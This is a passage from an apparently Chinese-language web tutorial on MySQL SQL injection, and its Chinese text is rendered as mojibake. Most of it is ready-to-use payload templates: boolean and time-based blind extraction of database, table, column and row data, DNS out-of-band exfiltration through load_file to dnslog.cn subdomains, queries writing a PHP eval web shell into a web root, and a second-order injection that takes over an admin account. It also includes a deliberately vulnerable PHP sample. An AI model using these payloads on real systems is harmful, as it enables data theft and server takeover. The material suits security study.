?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
</code></pre><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬Nä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
--------------------------------------------------------------------------------------
?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
--------------------------------------------------------------------------------------
?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬Nä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
--------------------------------------------------------------------------------------
?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—
â€¦â€¦â€¦â€¦
?id=1 and ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—
</code></pre><h1 id="å»¶æ—¶æ³¨å…¥"><a href="#å»¶æ—¶æ³¨å…¥" class="headerlink" title="å»¶æ—¶æ³¨å…¥"></a>å»¶æ—¶æ³¨å…¥</h1><p>å»¶æ—¶æ³¨å…¥æ˜¯åœ¨ç›²æ³¨çš„åŸºç¡€ä¸ŠåŠ äº†æ—¶é—´åˆ¤æ–­ï¼Œæ³¨å…¥æ‰‹æ³•å’Œç›²æ³¨ä¸€æ ·</p><p><strong>ä»£ç åˆ†æ</strong></p><pre><code class="php">&lt;?php
    $con = sqli_content(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;test&quot;);
    if (mysqli_connect_errno())&#123;
        echo &quot;è¿æ¥å¤±è´¥&quot; . mysqli_connect_errno();
    &#125;
    $id = $_GET[&#39;id&#39;];
    if (preg_match(&quot;/union/i&quot;, $id)) &#123;
        exit(&quot;&lt;html&gt;&lt;body&gt;no&lt;/body&gt;&lt;/html&gt;&quot;);
    &#125;
    $result = mysqli_query($con, &quot;select * from users where &#39;id&#39; =&#39;&quot; . $id . &quot;&#39;&quot;);
    $row = mysqli_fetch_array($result);
    if ($row)&#123;
        exit(&quot;&lt;html&gt;&lt;body&gt;yse&lt;/body&gt;&lt;/html&gt;&quot;);
    &#125;else&#123;
        exit(&quot;&lt;html&gt;&lt;body&gt;no&lt;/bofy&gt;&lt;/html&gt;&quot;);
    &#125;
?&gt;
</code></pre><p>å½“è®¿é—® <code>id=1&#39; and if(length(database())&gt;1,sleep(5),1) -- 123</code></p><p>æ‰§è¡Œçš„SQLè¯­å¥ä¸º <code>select * from users where &#39;id&#39;=&#39;1&#39; and if(length(database())&gt;1,sleep(5),1) -- 123 &#39;</code></p><p>å¦‚æœæ•°æ®åº“çš„é•¿åº¦å¤§äº1ï¼Œåˆ™æ‰§è¡Œsleep(5)ï¼ˆå»¶æ—¶5ç§’ï¼‰ï¼Œé€šè¿‡å»¶æ—¶æ¥åˆ¤æ–­SQLè¯­å¥çš„è¿è¡Œç»“æœ</p><table><thead><tr><th>å‡½æ•°</th><th>æè¿°</th></tr></thead><tbody><tr><td>sleep()</td><td>å»¶æ—¶</td></tr><tr><td>if(exp1, exp2, exp3)</td><td>å¦‚æœexp1æˆç«‹ï¼Œæ‰§è¡Œexp2ï¼Œå¦åˆ™æ‰§è¡Œexp3</td></tr></tbody></table><h2 id="æ•°æ®åº“-1"><a href="#æ•°æ®åº“-1" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>åº“åé•¿åº¦</p><pre><code class="sql">?id=1 and if(length(database())=12,sleep(10),1)
</code></pre><p>æ•°æ®åº“å</p><pre><code class="sql">?id=1 and if(left(database(),1) = &#39;l&#39;,sleep(10),1)
?id=1 and if(left(database(),3) = &#39;log&#39;,sleep(10),1)

â€¦â€¦â€¦â€¦â€¦â€¦

?id=1 and if(ascii(substr(database(),1,1))&gt;1,sleep(10),1)
?id=1 and if(ascii(substr(database(),2,1))&gt;1,sleep(10),1)
</code></pre><h2 id="æ•°æ®è¡¨-1"><a href="#æ•°æ®è¡¨-1" class="headerlink" title="æ•°æ®è¡¨"></a>æ•°æ®è¡¨</h2><p>æ•°æ®è¡¨ä¸ªæ•°</p><pre><code class="sql">?id=1 and if((select count(table_name) from information_schema.tables where table_schema = database()) = 3, sleep(10),1)
</code></pre><p>å½“å‰æ•°æ®è¡¨é•¿åº¦</p><pre><code class="sql">?id=1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit n,1),1))=é•¿åº¦,sleep(10),1)
</code></pre><p>æ•°æ®è¡¨å</p><pre><code class="sql">?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
</code></pre><h2 id="æ•°æ®å­—æ®µ-1"><a href="#æ•°æ®å­—æ®µ-1" class="headerlink" title="æ•°æ®å­—æ®µ"></a>æ•°æ®å­—æ®µ</h2><p>å­—æ®µåä¸ªæ•°</p><pre><code class="sql">?id=1 and if((select count(column_name) from information_schema.columns where table_name=&#39;ç¬¬1ä¸ªè¡¨å&#39;) = ä¸ªæ•°,sleep(10),1)

?id=1 and if((select count(column_name) from information_schema.columns where table_name=&#39;ç¬¬Nä¸ªè¡¨å&#39;) = ä¸ªæ•°,sleep(10),1)
</code></pre><p>å­—æ®µåé•¿åº¦</p><p>mè¡¨ç¤ºç¬¬å‡ ä¸ªå­—æ®µå (ä»0å¼€å§‹)</p><pre><code class="sql">?id=1 and if(length((select column_name from information_schema.columns where table_name=&#39;ç¬¬ä¸€ä¸ªè¡¨å&#39; limit m,1)) = é•¿åº¦,sleep(10),1)

?id=1 and if(length((select column_name from information_schema.columns where table_name=&#39;ç¬¬Nä¸ªè¡¨å&#39; limit m,1)) = é•¿åº¦,sleep(10),1)
</code></pre><h2 id="æ•°æ®-1"><a href="#æ•°æ®-1" class="headerlink" title="æ•°æ®"></a>æ•°æ®</h2><p>æ•°æ®ä¸ªæ•°</p><pre><code class="sql">?id=1 and if((select count(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨) = ä¸ªæ•°,sleep(10),1)
?id=1 and if((select count(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨) = ä¸ªæ•°,sleep(10),1)

?id=1 and if((select count(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨) = ä¸ªæ•°,sleep(10),1)
?id=1 and if((select count(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨) = ä¸ªæ•°,sleep(10),1)
</code></pre><p>æ•°æ®é•¿åº¦</p><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and if((select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1) = é•¿åº¦,sleep(10),1)
?id=1 and if((select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit N,1) = é•¿åº¦,sleep(10),1)
</code></pre><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬äºŒä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ¡æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and if((select length(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1) = é•¿åº¦,sleep(10),1)
?id=1 and if((select length(ç¬¬äºŒä¸ªå­—æ®µ) from ç¬¬ä¸€ä¸ªè¡¨ limit N,1) = é•¿åº¦,sleep(10),1)
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and if((select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit 0,1) = é•¿åº¦,sleep(10),1)
?id=1 and if((select length(ç¬¬ä¸€ä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit N,1) = é•¿åº¦,sleep(10),1)
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬Nä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®é•¿åº¦</p><pre><code class="sql">?id=1 and if((select length(ç¬¬Nä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit 0,1) = é•¿åº¦,sleep(10),1)
?id=1 and if((select length(ç¬¬Nä¸ªå­—æ®µ) from ç¬¬Nä¸ªè¡¨ limit 1,1) = é•¿åº¦,sleep(10),1)
</code></pre><p>æ•°æ®</p><p>è¿™é‡Œé€šè¿‡substr()æ¥åˆ‡æ¢æŸ¥è¯¢ç¬¬å‡ ä¸ªå­—ç¬¦ï¼Œé€šè¿‡limitæ¥åˆ‡æ¢æŸ¥è¯¢ç¬¬å‡ æ¡æ•°æ®ï¼Œåˆ‡æ¢å­—æ®µåæ¥æŸ¥è¯¢ç¬¬å‡ ä¸ªå­—æ®µï¼Œåˆ‡æ¢æ•°æ®è¡¨æ¥æŸ¥è¯¢ç¬¬å‡ ä¸ªæ•°æ®è¡¨</p><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
--------------------------------------------------------------------------------------
?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
</code></pre><p>ç¬¬ä¸€ä¸ªæ•°æ®è¡¨ç¬¬Nä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
--------------------------------------------------------------------------------------
?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬ä¸€ä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬ä¸€ä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
--------------------------------------------------------------------------------------
?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬ä¸€ä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
</code></pre><p>ç¬¬Nä¸ªæ•°æ®è¡¨ç¬¬Nä¸ªå­—æ®µç¬¬ï¼ˆ1 ~ nä¸ªï¼‰æ•°æ®</p><pre><code class="sql">?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit 0,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
--------------------------------------------------------------------------------------
?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),1,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
â€¦â€¦â€¦â€¦
?id=1 and if(ascii(substr((select ç¬¬Nä¸ªå­—æ®µ from ç¬¬Nä¸ªè¡¨ limit n,1),n,1)) = asciiçš„å­—ç¬¦æ•°å­—,sleep(10),1)
</code></pre><h1 id="DNSæ³¨å…¥"><a href="#DNSæ³¨å…¥" class="headerlink" title="DNSæ³¨å…¥"></a>DNSæ³¨å…¥</h1><p>DNSæ—¥å¿—æ³¨å…¥ï¼ˆå°†åŸŸåè½¬ä¸ºIPï¼‰ï¼Œé»˜è®¤linuxä¸èƒ½ä½¿ç”¨ï¼Œlinuxæ²¡æœ‰SMBæœåŠ¡ï¼ˆ445ç«¯å£ï¼‰</p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410095132.png"><h2 id="ä½¿ç”¨ç¯å¢ƒ"><a href="#ä½¿ç”¨ç¯å¢ƒ" class="headerlink" title="ä½¿ç”¨ç¯å¢ƒ"></a>ä½¿ç”¨ç¯å¢ƒ</h2><p>åœ¨æŸäº›æ— æ³•ç›´æ¥åˆ©ç”¨æ¼æ´è·å¾—å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œä½†æ˜¯ç›®æ ‡å¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œè¿™ä¸ªæ—¶å€™å°±å¯ä»¥é€šè¿‡DNSè¯·æ±‚æŠŠæ•°æ®å¤–å¸¦å‡ºæ¥ï¼Œå¯¹äºSQLç›²æ³¨ï¼Œå¸¸è§çš„æ–¹æ³•å°±æ˜¯äºŒåˆ†çŒœè§£ï¼Œå¾ˆéº»çƒ¦ï¼Œä¹Ÿå¾ˆå®¹æ˜“è¯·æ±‚è¿‡å¤šè¢«æ‰³ï¼Œæ‰€ä»¥å¯ä»¥å°†selectåˆ°çš„æ•°æ®å‘é€ç»™ä¸€ä¸ªurlï¼Œåˆ©ç”¨DNSè§£æäº§ç”Ÿçš„æ—¥å¿—æŸ¥çœ‹æ•°æ®ï¼Œä¹Ÿå°±æ˜¯å°†ç›²æ³¨è½¬æ¢æˆæ˜¾é”™æ³¨å…¥</p><h2 id="å‡½æ•°ä»‹ç»"><a href="#å‡½æ•°ä»‹ç»" class="headerlink" title="å‡½æ•°ä»‹ç»"></a>å‡½æ•°ä»‹ç»</h2><table><thead><tr><th>å‡½æ•°</th><th>è¯»å†™</th><th>æè¿°</th></tr></thead><tbody><tr><td>load_file()</td><td>è¯»æ–‡ä»¶</td><td>è¯»å–æ–‡ä»¶å¹¶è¿”å›å†…å®¹ä¸ºå­—ç¬¦ä¸²ï¼ˆæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼‰</td></tr><tr><td>into outfile()</td><td>å†™æ–‡ä»¶</td><td><code>select &#39;&lt;?php eval($_REQUEST[4];?&gt;&#39; into outfile &#39;C:/phpstudy/WWW/1.php&#39;</code></td></tr><tr><td>into dumpfile()</td><td>å†™æ–‡ä»¶</td><td></td></tr></tbody></table><p>load_file()çš„å¼€å¯ : <mark style="background:#FF5582A6">mysql.ini</mark>ä¸­æ·»åŠ <mark style="background:#FF5582A6">secure_file_priv&#x3D;</mark></p><h2 id="UNCè·¯å¾„"><a href="#UNCè·¯å¾„" class="headerlink" title="UNCè·¯å¾„"></a>UNCè·¯å¾„</h2><p>UNCè·¯å¾„å°±æ˜¯windowsæœ‰ä¸ªå«SMBçš„æœåŠ¡ï¼ˆ&#x2F;&#x2F;abc.com&#x2F;abcå°±æ˜¯è®¿é—®a.comä¸‹çš„abcå…±äº«æ–‡ä»¶å¤¹ï¼‰</p><pre><code class="sql">select load_file(&#39;c:/phpstudy/www/1.php&#39;); // è¯»æ–‡ä»¶
// é€šè¿‡load_fileè®¿é—®UNCè·¯å¾„å‘èµ·ç½‘ç»œè¯·æ±‚ï¼Œåœ¨é€šè¿‡è¿›è¡ŒåŸŸåè§£æï¼ŒæŠŠæƒ³è¦çš„æ•°æ®å¤–å¸¦å‡ºæ¥
select load_file(concat(&#39;//&#39;,(select database()), &#39;.DNSæœåŠ¡å™¨åŸŸå/abc&#39;));
</code></pre><h3 id="æ•°æ®åº“-2"><a href="#æ•°æ®åº“-2" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h3><pre><code class="sql">?id=1 and load_file(concat(â€˜//â€˜,(select database()),â€™.cpdvs2.dnslog.cn/abcâ€™))
</code></pre><h3 id="æ•°æ®è¡¨-2"><a href="#æ•°æ®è¡¨-2" class="headerlink" title="æ•°æ®è¡¨"></a>æ•°æ®è¡¨</h3><pre><code class="sql">?id=1 and load_file(concat(â€˜//â€˜,(select table_name from information_schema.tables where table_schema=database() limit 0,1),â€™.cpdvs2.dnslog.cn/abcâ€™))
</code></pre><h3 id="æ•°æ®å­—æ®µ-2"><a href="#æ•°æ®å­—æ®µ-2" class="headerlink" title="æ•°æ®å­—æ®µ"></a>æ•°æ®å­—æ®µ</h3><pre><code class="sql">?id=1 and load_file(concat(â€˜//â€˜,(select column_name from information_schema.colmuns where table_name=&#39;è¡¨å&#39; limit 0,1),â€™.cpdvs2.dnslog.cn/abcâ€™))
</code></pre><h3 id="æ•°æ®-2"><a href="#æ•°æ®-2" class="headerlink" title="æ•°æ®"></a>æ•°æ®</h3><pre><code class="sql">?id=1 and load_file(concat(â€˜//â€˜,(select å­—æ®µå from è¡¨å limit 0,1),â€™.nyoi6t.dnslog.cn/abcâ€™))
</code></pre><h3 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h3><p>å¯ä»¥é€šè¿‡å †å æ³¨å…¥ã€è”åˆæŸ¥è¯¢ç­‰æ–¹å¼è¿›è¡Œå†™æ–‡ä»¶</p><p>è”åˆæŸ¥è¯¢å‰æå¿…é¡»ä¿è¯å­—æ®µæ•°ä¸€æ ·ï¼Œè‹¥æ²¡æœ‰å›æ˜¾å¯ä»¥é€šè¿‡ union select 1,2,3,sleep(5) æ·»åŠ å»¶æ—¶æ¥åˆ¤æ–­å­—æ®µæ•°</p><pre><code class="sql">?id=1 union select 1,&#39;&lt;?php eval($_REQUEST[8]);?&gt;&#39; into outfile &#39;c:/phpstudy/www/1.php&#39;
</code></pre><h1 id="äºŒæ¬¡æ’åºæ³¨å…¥"><a href="#äºŒæ¬¡æ’åºæ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ’åºæ³¨å…¥"></a>äºŒæ¬¡æ’åºæ³¨å…¥</h1><p>äºŒæ¬¡æ’åºæ³¨å…¥ä¹Ÿæˆä¸ºå­˜å‚¨å‹çš„æ³¨å…¥ï¼Œå°±æ˜¯å°†å¯èƒ½å¯¼è‡´ sql æ³¨å…¥çš„å­—ç¬¦å…ˆå­˜å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œå½“å†æ¬¡è°ƒç”¨è¿™ä¸ªæ¶æ„æ„é€ çš„å­—ç¬¦æ—¶ï¼Œå°±å¯ä»¥å‡ºå‘ sql æ³¨å…¥ã€‚</p><p>å…ˆæ³¨å†Œè´¦å·ï¼ˆadminâ€™ #ï¼‰ &#x3D;&gt; ä¿®æ”¹å¯†ç ï¼ˆadminâ€™ #ï¼‰ &#x3D;&gt; è®¾ç½®æ–°å¯†ç  &#x3D;&gt; è´¦å·åç»è¿‡SQLè¯­å¥æ›´æ–°æ—¶å˜æˆäº† admin è´¦å·</p><ol><li>é»‘å®¢é€šè¿‡æ„é€ æ•°æ®çš„å½¢å¼ï¼Œåœ¨æµè§ˆå™¨æˆ–è€…å…¶ä»–è½¯ä»¶ä¸­æäº¤ HTTP æ•°æ®æŠ¥æ–‡è¯·æ±‚åˆ°æœåŠ¡ ç«¯è¿›è¡Œå¤„ç†ï¼Œæäº¤çš„æ•°æ®æŠ¥æ–‡è¯·æ±‚ä¸­å¯èƒ½åŒ…å«äº†é»‘å®¢æ„é€ çš„ SQL è¯­å¥æˆ–è€…å‘½ä»¤ã€‚</li><li>æœåŠ¡ç«¯åº”ç”¨ç¨‹åºä¼šå°†é»‘å®¢æäº¤çš„æ•°æ®ä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼Œé€šå¸¸æ˜¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œä¿å­˜çš„ æ•°æ®ä¿¡æ¯çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œå…¶ä»–åŠŸèƒ½æä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚åšå‡ºå“ åº”ã€‚</li><li>é»‘å®¢å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯ã€‚</li><li>æœåŠ¡ç«¯æ¥æ”¶åˆ°é»‘å®¢æäº¤çš„ç¬¬äºŒä¸ªè¯·æ±‚ä¿¡æ¯åï¼Œä¸ºäº†å¤„ç†è¯¥è¯·æ±‚ï¼ŒæœåŠ¡ç«¯ä¼šæŸ¥è¯¢æ•°æ®åº“ ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œä»è€Œå¯¼è‡´é»‘å®¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„ SQL è¯­å¥æˆ–è€…å‘½ä»¤åœ¨æœ åŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œã€‚</li><li>æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œé»‘å®¢å¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœæ•°æ®ä¿¡æ¯åˆ¤æ–­äºŒæ¬¡æ³¨ å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸã€‚</li></ol><p>æ­¤ä¾‹å­ä¸­æˆ‘ä»¬çš„æ­¥éª¤æ˜¯æ³¨å†Œä¸€ä¸ª adminâ€™#çš„è´¦å·ï¼Œæ¥ä¸‹æ¥ç™»å½•è¯¥å¸å·åè¿›è¡Œä¿®æ”¹å¯†ç ã€‚æ­¤æ—¶ ä¿®æ”¹çš„å°±æ˜¯ admin çš„å¯†ç ã€‚ SQLè¯­å¥å˜ä¸º <mark style="background:#FF5582A6">UPDATE users SET passwd&#x3D;â€New_Passâ€ WHERE username &#x3D;â€™ adminâ€™ # â€˜ AND password&#x3D;â€™</mark><br>ä¹Ÿå°±æ˜¯æ‰§è¡Œäº† <mark style="background:#FF5582A6">UPDATE users SET passwd&#x3D;â€New_Passâ€ WHERE username &#x3D;â€™ adminâ€™</mark></p><h1 id="æ–‡ä»¶æ“ä½œ"><a href="#æ–‡ä»¶æ“ä½œ" class="headerlink" title="æ–‡ä»¶æ“ä½œ"></a>æ–‡ä»¶æ“ä½œ</h1><p>ä¸‰ç§æ–¹æ³•æŸ¥çœ‹æœ‰æ— æƒé™è¯»å†™</p><pre><code class="sql">select @@secure_file_priv; 
select @@global.secure_file_priv; 
show variables like &quot;secure_file_priv&quot;;
</code></pre><p>æ²¡æœ‰ä¿®æ”¹é…ç½®æ–‡ä»¶ä¹‹å‰</p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410090257.png"><p>ä¿®æ”¹å</p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410090335.png"><p>ä¿®æ”¹ secure-file-priv å€¼ï¼š</p><ul><li>é€šè¿‡ä¿®æ”¹ my.ini æ–‡ä»¶ï¼Œæ·»åŠ ï¼šsecure-file-priv&#x3D;</li><li>å¯åŠ¨é¡¹æ·»åŠ å‚æ•°ï¼šmysqld.exe â€“secure-file-priv&#x3D;</li></ul><p>ä¿®æ”¹å®Œæˆåä¾¿é‡å¯</p><img data-src="/APT/web%E6%B8%97%E9%80%8F/MySQL%E6%B3%A8%E5%85%A5/20230410090217.png"><h2 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h2><p>é™åˆ¶ ï¼š</p><ul><li>å‰ä¸¤ç§éœ€è¦ secure-file-priv æ— å€¼æˆ–ä¸ºæœ‰åˆ©ç›®å½•ã€‚</li><li>éƒ½éœ€è¦çŸ¥é“è¦è¯»å–çš„æ–‡ä»¶æ‰€åœ¨çš„ç»å¯¹è·¯å¾„ã€‚</li><li>è¦è¯»å–çš„æ–‡ä»¶å¤§å°å¿…é¡»å°äº max_allowed_packet æ‰€è®¾ç½®çš„å€¼ <code>show VARIABLES like &#39;%max_allowed_packet%&#39;;</code></li></ul><pre><code class="sql">select load_file(&#39;æ–‡ä»¶çš„ç»å¯¹è·¯å¾„&#39;)
